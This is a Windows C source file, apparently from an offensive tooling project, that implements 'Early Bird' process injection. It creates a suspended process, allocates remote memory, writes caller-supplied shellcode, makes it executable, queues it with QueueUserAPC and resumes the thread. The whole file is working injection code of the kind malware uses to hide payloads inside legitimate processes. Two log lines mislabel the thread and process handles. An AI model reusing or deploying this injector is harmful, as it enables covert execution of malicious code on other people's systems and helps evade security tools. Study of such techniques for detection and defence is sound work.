#include "box.h"

BOOL CreateSuspendedProcess
(
	IN LPCSTR ProcessName,
	OUT PHANDLE hProcess,
	OUT PHANDLE hThread,
	OUT PDWORD PID
)
{

	BOOL State = TRUE;
	STARTUPINFOA StartupInfo;
	PROCESS_INFORMATION ProcessInfo;

	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));

	StartupInfo.cb = sizeof(STARTUPINFO);

	if (!CreateProcessA(NULL, ProcessName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &StartupInfo, &ProcessInfo))
	{
		PRINT_ERROR("CreateProcessA");
		State = FALSE; goto CLEANUP;
	}

	if (!ProcessInfo.hProcess)
	{
		WARN("Failed to Create Process");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Thread Handle", ProcessInfo.hProcess);
	INFO("[0x%p] Process Handle", ProcessInfo.hThread);
	INFO("[%d] Process ID", ProcessInfo.dwProcessId);

	*PID = ProcessInfo.dwProcessId;
	*hProcess = ProcessInfo.hProcess;
	*hThread = ProcessInfo.hThread;


CLEANUP:

	return State;

}

BOOL EarlyBirdInject
(
	IN HANDLE hProcess,
	IN HANDLE hThread,
	IN PBYTE sShellcode,
	IN SIZE_T sSizeofShellcode,
	IN PVOID* pAddress
)

{

	BOOL	State			= TRUE;
	SIZE_T	BytesWritten	= NULL;
	DWORD	dwOldProt		= 0;

	*pAddress = VirtualAllocEx(hProcess, NULL, sSizeofShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*pAddress == NULL)
	{
		PRINT_ERROR("VirtualAllocEx");
		State = FALSE; goto CLEANUP;
	}

	INFO("Allocated Memory with PAGE_READWRITE Allocation");
	OKAY("Allocated %zu Bytes to Remote Process", sSizeofShellcode);

	if (!WriteProcessMemory(hProcess, *pAddress, sShellcode, sSizeofShellcode, &BytesWritten))
	{
		PRINT_ERROR("WriteProcessMemory");
		State = FALSE; goto CLEANUP;
	}

	OKAY("Successfully Wrote %zu Bytes to Process Memory!", sSizeofShellcode);

	if (!VirtualProtectEx(hProcess, *pAddress, sSizeofShellcode, PAGE_EXECUTE_READ, &dwOldProt))
	{
		PRINT_ERROR("VirtualProtectEx");
		State = FALSE; goto CLEANUP;
	}

	OKAY("Protection Allocation Changed || Page_ReadWrite --> Page_Execute_Read");

	INFO("Running QueueUserAPC...");

	QueueUserAPC(*pAddress, hThread, NULL);

	OKAY("Finished Queueing!");

	if (!ResumeThread(hThread))
	{
		PRINT_ERROR("ResumeThread");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] waiting for thread to finish execution...", hThread);

	WaitForSingleObject(hThread, INFINITE);

	INFO("[0x%p] thread finished execution! beginning cleanup...", hThread);

CLEANUP:

	if (hThread)
		CloseHandle(hThread);

	if (hProcess)
		CloseHandle(hProcess);


	return State;

}


